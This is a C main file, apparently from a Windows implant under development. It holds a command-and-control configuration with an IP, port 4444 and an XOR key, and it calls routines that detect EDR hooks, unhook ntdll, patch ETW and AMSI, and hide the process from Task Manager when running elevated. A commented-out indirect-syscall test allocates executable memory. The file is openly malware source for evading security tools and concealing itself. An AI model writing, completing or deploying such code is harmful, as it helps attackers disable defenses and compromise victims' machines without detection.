#include <stdio.h>
#include "config.h"
#include "recon.h"
#include "injection.h"
#include "evasion.h"
#include <Windows.h>

int main(VOID)

{
	//doesn't do anything yet and xor key wont live in process.
	IMPLANT_CONFIG config = { "192.168.1.1", 4444, 60, "BASTILA", 0x42 };
	//printf("CONFIG: %s %d %d %s %X\n", 
	// config.c2ip, config.port, 
	// config.sleep_interval, 
	// config.implant_name, 
	// config.xor_key);
	
	// RECON
	//collect_recon();

	
	// INDIRECT SYSCALL TEST
//	g_ssn = getSSN("NtAllocateVirtualMemory");
//	g_syscall = getSyscallAddr("NtAllocateVirtualMemory");
//	PVOID base = NULL;
//	SIZE_T size = 4096;
//	NTSTATUS status = iNtAllocateVirtualMemory(GetCurrentProcess(),           // target process handle
//			&base,              // kernel writes allocated address here
//			0,                  // zero bits
//			&size,              // kernel writes actual size here
//			MEM_COMMIT | MEM_RESERVE,
//			PAGE_EXECUTE_READWRITE
//		);
//	if (status == 0) {
//	printf("[+] Allocated at: %p\n", base);
//}


	

	if (!EdrHookerCheck()) {
		unhook_Ntdll();
	}
	EtwPatch();
	AmsiPatch();

	// patch task manager
	if (IsElevated()) {
			printf("Running elevated. hiding process.\n");
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WatchForTaskmgr, NULL, 0, NULL);
		}

	Sleep(INFINITE);
	return 0;
}